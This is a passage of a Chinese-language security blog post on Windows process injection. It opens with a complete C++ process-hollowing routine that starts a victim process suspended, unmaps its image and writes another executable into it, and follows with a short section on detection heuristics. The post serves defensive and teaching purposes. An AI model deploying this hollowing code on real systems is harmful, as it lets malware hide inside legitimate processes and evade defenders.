<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InjectProcess</span><span class="params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> HANDLE hFile;</span><br><span class="line"> DWORD dwFileSize;    <span class="comment">//文件大小</span></span><br><span class="line"> IMAGE_DOS_HEADER DosHeader;</span><br><span class="line"> IMAGE_NT_HEADERS NtHeader;</span><br><span class="line"> PROCESS_INFORMATION pi;</span><br><span class="line"> STARTUPINFO si;</span><br><span class="line"> CONTEXT context;</span><br><span class="line"> PVOID ImageBase;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> ImageSize;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> BaseAddr;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> retByte = <span class="number">0</span>;</span><br><span class="line"> LONG offset;</span><br><span class="line"> HMODULE hNtDll=<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(!hNtDll)</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="built_in">GetProcAddress</span>(hNtDll,<span class="string">&quot;ZwUnmapViewOfSection&quot;</span>);</span><br><span class="line"> <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="built_in">sizeof</span>(si));</span><br><span class="line"> <span class="built_in">memset</span>(&amp;pi, <span class="number">0</span>, <span class="built_in">sizeof</span>(pi));</span><br><span class="line"> si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line"> hFile = ::<span class="built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> &#125;</span><br><span class="line"> ::<span class="built_in">SetFilePointer</span>(hFile, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line"> dwFileSize = ::<span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"> LPBYTE pBuf = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"> <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, dwFileSize);</span><br><span class="line"> DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    ::<span class="built_in">ReadFile</span>( hFile</span><br><span class="line">        , pBuf</span><br><span class="line">        , dwFileSize</span><br><span class="line">        , &amp;dwNumberOfBytesRead</span><br><span class="line">        , <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;DosHeader,pBuf,<span class="built_in">sizeof</span>(IMAGE_DOS_HEADER));</span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"> <span class="comment">//检查PE结构</span></span><br><span class="line"> <span class="comment">//以挂起方式进程</span></span><br><span class="line"> BOOL res = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>,VictimFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> &#123;</span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="comment">//如果调用失败</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="type">void</span> *)(context.Ebx + <span class="number">8</span>),&amp;BaseAddr,<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>),<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (!BaseAddr)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//拆卸傀儡进程内存模块</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ZwUnmapViewOfSection</span>((<span class="type">unsigned</span> <span class="type">long</span>)pi.hProcess,BaseAddr))</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  ImageBase = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, </span><br><span class="line">   (<span class="type">void</span> *)NtHeader.OptionalHeader.ImageBase,</span><br><span class="line">   NtHeader.OptionalHeader.SizeOfImage, </span><br><span class="line">   MEM_RESERVE|MEM_COMMIT, </span><br><span class="line">   PAGE_EXECUTE_READWRITE);  <span class="comment">//ImageBase 0x00400000</span></span><br><span class="line">  <span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag = <span class="built_in">GetLastError</span>();</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//替换傀儡进程内存数据</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag2 = <span class="built_in">GetLastError</span>();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//DOS 头 + PE 头 + 区块表的总大小</span></span><br><span class="line">  <span class="comment">//定位到区块头</span></span><br><span class="line">  offset = DosHeader.e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS);</span><br><span class="line">  IMAGE_SECTION_HEADER secHeader;</span><br><span class="line">  WORD i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//定位到各个区块</span></span><br><span class="line">   ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER));</span><br><span class="line">   <span class="built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);</span><br><span class="line">   <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="comment">//重置 执行文件入口</span></span><br><span class="line">  <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="type">void</span> *)(context.Ebx + <span class="number">8</span>), </span><br><span class="line">   &amp;ImageBase,   <span class="comment">//4194304</span></span><br><span class="line">   <span class="number">4</span>, &amp;retByte);</span><br><span class="line">  context.Eax = (<span class="type">unsigned</span> <span class="type">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">  <span class="built_in">SetThreadContext</span>(pi.hThread,&amp;context);</span><br><span class="line">  <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"> ::<span class="built_in">CloseHandle</span>(hFile);  </span><br><span class="line"> <span class="keyword">delete</span>[] pBuf;</span><br><span class="line"> <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h2><ol>
<li>注册表相关注入继续可以通过Hook写注册表相关API实现监控</li>
<li>SetWindowsHookEx则需要检查最后一个参数是否为0，为0表示全局注入，这是我们<br>  关注的地方。但是输入法之类的正常程序也可能使用注入技术。</li>
<li>CreateRemoteThread进程注入比较复杂，核心要点是要有跨进程写入数据的动作，<br>  后续从两个维度来进行检查</li>
</ol>
<h3 id="2-1-检查跨进程写入的数据"><a href="#2-1-检查跨进程写入的数据" class="headerlink" title="2.1 检查跨进程写入的数据"></a>2.1 检查跨进程写入的数据</h3><p>虽然WriteProcessMemory的底层API经常被Windows底层用作数据传递，但是通过<br>特征可以识别出来</p>
<ol>
<li>写入的数据是PE文件</li>
<li>写入的数据里包含.dll (一般是DLL文件名，或者是导入表相关数据)</li>
<li>写入超长数据</li>
</ol>
<h3 id="2-2-检查线程代码执行部分地址"><a href="#2-2-检查线程代码执行部分地址" class="headerlink" title="2.2 检查线程代码执行部分地址"></a>2.2 检查线程代码执行部分地址</h3><p>检查代码地址是否在WriteProcessMemory写入的数据区域之内</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html">Windows DLL Injection Basics</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.csdn.net/evi10r/article/details/6745138">使用异步过程调用（APC）实现模块注入</a></li>
<li><a target="_blank" rel="noopener" href="http://bbs.pediy.com/showthread.php?t=99206">Ring3下WX方法结束微点2009</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.w4kfu.com/tag/duqu">New method of injection</a></li>
<li><a target="_blank" rel="noopener" href="http://www.i7s3curi7y.com/win32-code-injection-techniques">The Ultimate Win32 code injection Reference</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://usmacd.com">henices</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://usmacd.com/cn/process_injection/">https://usmacd.com/cn/process_injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://usmacd.com" target="_blank">安全代码</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/windows/">windows</a></div><div class="post-share"><div class="social-share" data-image="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/cn/python_pip/" title="Python 多版本使用 pip"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Python 多版本使用 pip</div></div><div class="info-2"><div class="info-item-1">Q：Fedora 31 提供的 Python3.7， 想使用 Python3.8， 用系统的pip3 只会给 Python3.7 安装库，如何解决 A: 12curl -O https://bootstrap.pypa.io/get-pip.pypython3.8 get-pip.py  执行上面命令后，会在 &#x2F;usr&#x2F;local&#x2F;bin&#x2F; 下生成和 pip 相关的脚本，把这些脚本删除，要不可能会和系统的 pip3 冲突。接下来就可以使用下面的命令行安装 Python3.8 的库 python3.8 -m pip install pyhash --user 在安装过程中可能会因为众所周知的原因导致网络出错，备好梯子即可。 </div></div></div></a><a class="pagination-related" href="/cn/oracle_run_os_cmd/" title="Execute os command in Oracle Database"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Execute os command in Oracle Database</div></div><div class="info-2"><div class="info-item-1">1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; ASimport java.lang.*;import java.io.*;public class JAVACMD&#123; public static void execCommand (String command) throws IOException &#123;    try &#123;        String[] finalCommand;        if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) != -1) &...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/cn/ollama_unauthenticated/" title="Ollama 的未授权访问问题"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-20</div><div class="info-item-2">Ollama 的未授权访问问题</div></div><div class="info-2"><div class="info-item-1">Ollama 是一个简单易用的本地大模型运行框架，它可以让你在本地电脑上轻松运行和管理各种大语言模型。Github 地址：https://github.com/ollama/ollama 有用户提出给 Ollama API 添加认证的需求 Requesting support for basic auth or API key authentication， Ollama 官方没有处理，所以在默认设置下 Ollama 存在未授权访问问题。 以下的代码在 Ollama v0.5.11 下测试成功。 判断是否 Ollama 运行在 11434 端口1234567curl -i http://127.0.0.1:11434HTTP/1.1 200 OKContent-Type: text/plain; charset=utf-8Date: Tue, 18 Feb 2025 11:12:57 GMTContent-Length: 17Ollama is running   列出 Ollama 提供的 LLM 模型curl http://127.0.0.1:11434/api/tags |...</div></div></div></a><a class="pagination-related" href="/cn/AFL++%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E4%BE%8B/" title="AFL++ 漏洞挖掘实例"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-01</div><div class="info-item-2">AFL++ 漏洞挖掘实例</div></div><div class="info-2"><div class="info-item-1">☆ 1. 模糊测试工具 AFL &#x2F; AFL++介绍模糊测试是一种黑盒测试方法，它通过向软件输入随机或异常的数据，来触发软件中的错误或异常。AFL 是 Google 开发的一款 fuzz 工具，它最初由 Michal Zalewski 开发，被设计为一种模糊测试工具，用于自动发现程序中的漏洞。 在 AFL 之前，模糊测试工具大多采用随机生成输入数据的方法。这种方法虽然简单，但效率低下，很难发现软件中的隐藏路径。AFL 引入了覆盖率导向的模糊测试方法，它会根据软件的执行路径来优化输入数据。这种方法可以有效地提高模糊测试的效率，并更容易发现软件中的隐藏路径。 AFL 的发布，标志着模糊测试工具进入了新的时代。AFL 的成功，激发了许多其他研究人员和开发人员对模糊测试工具的改进和研究。它对软件安全领域产生了深远的影响。AFL 的成功，证明了模糊测试是一种有效的软件安全测试方法。 AFL 在模糊测试工具发展史上的具体贡献主要有：1）开创了覆盖率导向模糊测试的新时代2）极大地提高了模糊测试的效率和效果3）激发了其他研究人员和开发人员对模糊测试工具的改进和研究 AFL作为一款开创性的...</div></div></div></a><a class="pagination-related" href="/cn/qemu_kvm/" title="VMware Workstation Windows 10 host Ubuntu 18.04 Guest 中加载 Linux 内核 kvm 模块"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="info-item-2">VMware Workstation Windows 10 host Ubuntu 18.04 Guest 中加载 Linux 内核 kvm 模块</div></div><div class="info-2"><div class="info-item-1">这里在 VMware Workstation Guset OS 里使用 qemu 的用法，有点像俄罗斯套娃。 qemu.sh 123456789101112qemu-system-x86_64 \  -m 2G \  -smp 2 \  -kernel $KERNEL/arch/x86——64/boot/bzImage \  -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \  -drive file=$IMAGE/bullseye.img,format=raw \  -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \  -net nic,model=e1000 \  -enable-kvm \  -nographic \  -pidfile vm.pid \  2&gt;&amp;1 | tee vm.log  执行命令后 bash ./qemu.sh 后报错 12Could not access K...</div></div></div></a><a class="pagination-related" href="/cn/webview_java/" title="Android WebView 漏洞"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Android WebView 漏洞</div></div><div class="info-2"><div class="info-item-1">☆ 来自 developer.android.com 的信息Android 官方网站对addJavascriptInterface的介绍如下： 123456789101112public void addJavascriptInterface (Object object, String name)  Added in API level 1Injects the supplied Java object into this WebView. The object is injected intothe JavaScript context of the main frame, using the supplied name. This allows the Java object&#x27;s methods to be accessed from JavaScript. For applicationstargeted to API level JELLY_BEAN_MR1 and above, only public methods that are annotated w...</div></div></div></a><a class="pagination-related" href="/cn/request_RESERVED_CVE/" title="How to request a RESERVED CVE"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">How to request a RESERVED CVE</div></div><div class="info-2"><div class="info-item-1">在申请 CVE 过程中会遇到一个问题，向软件官方提交漏洞修复后，由于软件官方不是CNA 无法直接分配CVE，而申请CVE 通常需要一个软件官方确认的链接，而有些比较正规的软件在漏洞修复之前是不会有公开链接的，这就无法申请CVE了。 有点鸡生蛋，蛋生鸡的感觉。解决这个问题的办法是申请一个 RESERVED CVE。 申请 RESERVED CVE 方法申请 RESERVED CVE，也是需要填写的CVE 申请表格的 https://cveform.mitre.org/，选择 Request CVE ID 根据提示的重要信息： 12345IMPORTANT: Once a CVE ID is assigned to your vulnerability, it will not be published in the CVE List until you have submitted a URL pointing to public information about the vulnerability. Without a public reference, the CVE ID ...</div></div></div></a><a class="pagination-related" href="/cn/oracle_run_os_cmd/" title="Execute os command in Oracle Database"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Execute os command in Oracle Database</div></div><div class="info-2"><div class="info-item-1">1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; ASimport java.lang.*;import java.io.*;public class JAVACMD&#123; public static void execCommand (String command) throws IOException &#123;    try &#123;        String[] finalCommand;        if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) != -1) &...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">henices</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">166</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/about"><div class="headline">关于</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="/rss.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #4c566a;"></i></a><a class="social-icon" href="https://x.com/henices" target="_blank" title="Twitter"><i class="fab fa-x-twitter" style="color: #4c566a;"></i></a><a class="social-icon" href="mailto:zhouzhenster@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4c566a;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Process-Injection-%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">1. Process Injection 方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-SetWindowsHookEx"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 SetWindowsHookEx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-lpk-dll"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 lpk.dll</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%83%BD%E8%AE%A9%E7%A8%8B%E5%BA%8F%E5%8A%A0%E8%BD%BD%E6%88%91%E4%BB%AC%E7%9A%84lpk-dll%E8%80%8C%E4%B8%8D%E6%98%AF%E7%B3%BB%E7%BB%9F%E7%9C%9F%E6%AD%A3%E7%9A%84dll"><span class="toc-number">1.2.1.</span> <span class="toc-text">如何能让程序加载我们的lpk.dll而不是系统真正的dll</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%80%89%E5%8F%96lpk-dll"><span class="toc-number">1.2.2.</span> <span class="toc-text">为什么选取lpk.dll</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-CreateRemoteThread"><span class="toc-number">1.3.</span> <span class="toc-text">1.3  CreateRemoteThread</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%B8%AADLL"><span class="toc-number">1.3.1.</span> <span class="toc-text">实现个DLL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98"><span class="toc-number">1.3.2.</span> <span class="toc-text">写远程进程内存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-AppInit-DLLs"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 AppInit_DLLs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-QueueUserApc"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 QueueUserApc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-ZwMapViewOfSection"><span class="toc-number">1.6.</span> <span class="toc-text">1.6 ZwMapViewOfSection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">2. 检测方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%A3%80%E6%9F%A5%E8%B7%A8%E8%BF%9B%E7%A8%8B%E5%86%99%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 检查跨进程写入的数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%A3%80%E6%9F%A5%E7%BA%BF%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86%E5%9C%B0%E5%9D%80"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 检查线程代码执行部分地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/know_Evolution/" title="如何理解演化论的思想">如何理解演化论的思想</a><time datetime="2025-11-20T16:00:00.000Z" title="发表于 2025-11-21 00:00:00">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/investment_expectation/" title="金融投资中的预期思维">金融投资中的预期思维</a><time datetime="2025-11-19T16:00:00.000Z" title="发表于 2025-11-20 00:00:00">2025-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/duanyongping/" title="段永平退休20多年后罕见公开访谈">段永平退休20多年后罕见公开访谈</a><time datetime="2025-11-11T16:00:00.000Z" title="发表于 2025-11-12 00:00:00">2025-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/how_to_tell_a_story/" title="如何讲好一个故事">如何讲好一个故事</a><time datetime="2025-11-11T16:00:00.000Z" title="发表于 2025-11-12 00:00:00">2025-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/naval_reading/" title="纳瓦尔的阅读方法">纳瓦尔的阅读方法</a><time datetime="2025-10-28T16:00:00.000Z" title="发表于 2025-10-29 00:00:00">2025-10-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By henices</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div 